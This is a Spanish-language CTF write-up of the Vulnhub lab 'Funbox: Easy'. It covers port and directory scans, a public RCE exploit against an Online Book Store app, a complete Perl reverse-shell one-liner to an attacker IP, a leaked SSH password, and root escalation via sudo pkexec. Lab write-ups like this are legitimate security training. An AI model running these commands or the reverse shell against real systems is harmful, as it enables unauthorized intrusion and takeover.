+++
title = 'Funbox: Easy - Vulnhub'
+++

[link => Funbox: Easy](https://www.vulnhub.com/entry/funbox-easy,526/#download) 

---

## Escaneo de red con nmap para descubrir máquina objetivo

```bash
nmap -sn 10.38.1.0/24
```

![nmaphd](/images/writeups/vulnhub/funboxeasy/nmaphd.png)

### La IP de la máquina objetivo es **10.38.1.16**

## Escaneo de la máquina objetivo en busca de puertos abiertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.38.1.16 -oN target_scan.nmap
```

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-12 21:44 EDT
Initiating ARP Ping Scan at 21:44
Scanning 10.38.1.16 [1 port]
Completed ARP Ping Scan at 21:44, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:44
Scanning 10.38.1.16 [65535 ports]
Discovered open port 80/tcp on 10.38.1.16
Discovered open port 22/tcp on 10.38.1.16
Discovered open port 33060/tcp on 10.38.1.16
Completed SYN Stealth Scan at 21:44, 3.11s elapsed (65535 total ports)
Nmap scan report for 10.38.1.16
Host is up, received arp-response (0.000090s latency).
Scanned at 2024-04-12 21:44:19 EDT for 3s
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 64
80/tcp    open  http    syn-ack ttl 64
33060/tcp open  mysqlx  syn-ack ttl 64
MAC Address: 08:00:27:9D:49:4A (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.53 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

### **Puertos Abiertos: 22,80,33060**

## Ejecución de scripts con nmap

```bash
sudo nmap -sCV -p22,80,33060 10.38.1.16 -oN scripts_exec.nmap
```

```bash
Nmap scan report for 10.38.1.16
Host is up (0.00066s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2:d8:51:6e:c5:84:05:19:08:eb:c8:58:27:13:13:2f (RSA)
|   256 b0:de:97:03:a7:2f:f4:e2:ab:4a:9c:d9:43:9b:8a:48 (ECDSA)
|_  256 9d:0f:9a:26:38:4f:01:80:a7:a6:80:9d:d1:d4:cf:ec (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_gym
|_http-server-header: Apache/2.4.41 (Ubuntu)
33060/tcp open  mysqlx?
```

## Enumeración de directorios con gobuster

```bash
gobuster dir -u http://10.38.1.16/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.38.1.16/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/store                (Status: 301) [Size: 308] [--> http://10.38.1.16/store/]
/admin                (Status: 301) [Size: 308] [--> http://10.38.1.16/admin/]
/secret               (Status: 301) [Size: 309] [--> http://10.38.1.16/secret/]
/gym                  (Status: 301) [Size: 306] [--> http://10.38.1.16/gym/]
/server-status        (Status: 403) [Size: 275]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

## Búsqueda de exploit para el software CSE bookstore

```bash
searchsploit Online Book Store 1.0 - Unauthenticated Remote Code Execution
```
```bash
----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
----------------------------------------------------------------------------- ---------------------------------
Online Book Store 1.0 - Unauthenticated Remote Code Execution                | php/webapps/47887.py
----------------------------------------------------------------------------- ---------------------------------
```

### Ejecución de exploit con python

```bash
python3 book_store_exploit.py http://10.38.1.16/store/
```
### Ejecución de comandos 

#### Revshell perl

```pl
perl -e 'use Socket;$i="10.38.1.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
## Contraseña encontrada para el usuario tony en password.txt

![password](/images/writeups/vulnhub/funboxeasy/password.png)

## Conexión vía ssh con el usuario tony y contraseña yxcvbnmYYY

```bash
ssh tony@10.38.1.16
```

## Permisos sudo 

```bash
tony@funbox3:~$ sudo -l
Matching Defaults entries for tony on funbox3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tony may run the following commands on funbox3:
    (root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
    (root) NOPASSWD: /usr/bin/cancel
    (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
```

## Escalada de privilegios con pkexec

```bash
tony@funbox3:~$ sudo pkexec /bin/sh
```

## Flag del usuario root

```bash
# whoami
root
# cd ..
# ls
bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  swap.img  tmp  var
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   sys       usr
# cd root
# ls
root.flag  snap
# cat root.flag
 __________          ___.                      ___________                     
\_   _____/_ __  ____\_ |__   _______  ___ /\  \_   _____/____    _________.__.
 |    __)|  |  \/    \| __ \ /  _ \  \/  / \/   |    __)_\__  \  /  ___<   |  |
 |     \ |  |  /   |  \ \_\ (  <_> >    <  /\   |        \/ __ \_\___ \ \___  |
 \___  / |____/|___|  /___  /\____/__/\_ \ \/  /_______  (____  /____  >/ ____|
     \/             \/    \/            \/             \/     \/     \/ \/     

```

